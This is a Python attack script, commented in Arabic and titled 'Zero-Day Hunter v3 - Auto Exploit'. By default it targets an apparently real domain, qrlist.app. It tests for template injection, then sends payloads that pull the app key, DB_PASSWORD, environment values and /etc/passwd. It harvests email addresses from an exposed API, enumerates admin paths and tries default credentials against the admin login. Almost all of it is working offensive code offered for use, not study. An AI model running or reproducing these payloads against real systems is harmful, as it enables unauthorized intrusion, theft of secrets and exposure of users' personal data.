#!/usr/bin/env python3
"""
💣 Zero-Day Hunter v3 - Auto Exploit
يكتشف الثغرات ويستغلها تلقائياً
"""
import requests, sys, json, os, re, random, time, base64
from datetime import datetime
from urllib.parse import urlparse

class ZeroDayV3:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.findings = []
        self.exploits = []
        self.session = requests.Session()
    
    def log(self, msg): print(f"[💣] {msg}")
    
    def find_ssti(self):
        """اكتشاف SSTI"""
        self.log("🔍 SSTI...")
        try:
            r = self.session.get(f"{self.target}/api/stores?q={{{{7*7}}}}", timeout=5)
            if "49" in r.text:
                self.findings.append({"type":"SSTI","payload":"{{7*7}}"})
                self.log("   🚨 SSTI: {{7*7}} = 49")
                
                # محاولة استغلال
                return self.exploit_ssti()
        except:
            pass
        return False
    
    def exploit_ssti(self):
        """استغلال SSTI"""
        self.log("   ⚔️ استغلال SSTI...")
        
        payloads = [
            "{{config('app.key')}}",
            "{{env('APP_KEY')}}",
            "{{env('DB_PASSWORD')}}",
            "{{file_get_contents('/etc/passwd')}}",
        ]
        
        for p in payloads:
            try:
                r = self.session.get(f"{self.target}/api/stores?q={{{{{p}}}}}", timeout=5)
                if len(r.text) > 20 and len(r.text) < 500 and "html" not in r.text.lower():
                    self.exploits.append({"type":"SSTI","payload":p,"result":r.text[:200]})
                    self.log(f"   🚨 Exploit: {p} → {r.text[:100]}")
            except:
                pass
        
        return len(self.exploits) > 0
    
    def find_open_api(self):
        """اكتشاف API مكشوف"""
        self.log("🔍 API...")
        try:
            r = self.session.get(f"{self.target}/api/stores", timeout=5)
            if r.status_code == 200 and len(r.text) > 100:
                try:
                    data = r.json()
                    stores = data.get('data', data) if isinstance(data, dict) else data
                    if isinstance(stores, list):
                        self.findings.append({"type":"OpenAPI","stores":len(stores)})
                        self.log(f"   🚨 API مكشوف: {len(stores)} متجر")
                        
                        # استخراج بيانات
                        for store in stores[:3]:
                            if isinstance(store, dict):
                                for key, value in store.items():
                                    if isinstance(value, str) and '@' in value:
                                        self.exploits.append({"type":"Email","value":value})
                                        self.log(f"   📧 {value}")
                except:
                    pass
        except:
            pass
    
    def find_admin(self):
        """اكتشاف صفحة الإدارة"""
        self.log("🔍 Admin...")
        try:
            for path in ["/admin","/admin/login","/admin/dashboard"]:
                r = self.session.get(f"{self.target}{path}", timeout=5, allow_redirects=False)
                if r.status_code in [200, 302]:
                    self.findings.append({"type":"AdminPage","path":path,"status":r.status_code})
                    self.log(f"   🚨 {path} → {r.status_code}")
        except:
            pass
    
    def auto_dict_attack(self):
        """Dict Attack تلقائي"""
        self.log("🔑 Dict Attack...")
        creds = [("admin","admin"),("admin","password"),("admin","123456"),("root","root")]
        
        for user, pwd in creds:
            try:
                r = self.session.post(f"{self.target}/admin/login",
                    data={"email":f"{user}@qrlist.app","password":pwd}, timeout=5)
                if r.status_code == 200 and len(r.text) > 5000:
                    self.exploits.append({"type":"Password","user":user,"pass":pwd})
                    self.log(f"   🚨🚨🚨 {user}:{pwd}")
                    return True
            except:
                pass
        return False
    
    def run(self):
        self.log(f"💣 Zero-Day Hunter v3: {self.target}")
        self.log("═" * 60)
        
        self.find_ssti()
        self.find_open_api()
        self.find_admin()
        self.auto_dict_attack()
        
        score = len(self.findings) * 10 + len(self.exploits) * 50
        self.log(f"\n📊 Score: {score}/100")
        self.log(f"   🔍 Findings: {len(self.findings)}")
        self.log(f"   💣 Exploits: {len(self.exploits)}")
        
        for ex in self.exploits:
            self.log(f"   🚨 {ex['type']}: {ex.get('payload',ex.get('value',ex.get('user','?')))}")
        
        # حفظ
        os.makedirs("logs/zeroday", exist_ok=True)
        fname = f"logs/zeroday/v3_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"target":self.target,"findings":self.findings,"exploits":self.exploits,"score":score}, f, indent=2)
        self.log(f"📁 {fname}")
        
        return self.exploits

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    ZeroDayV3(target).run()
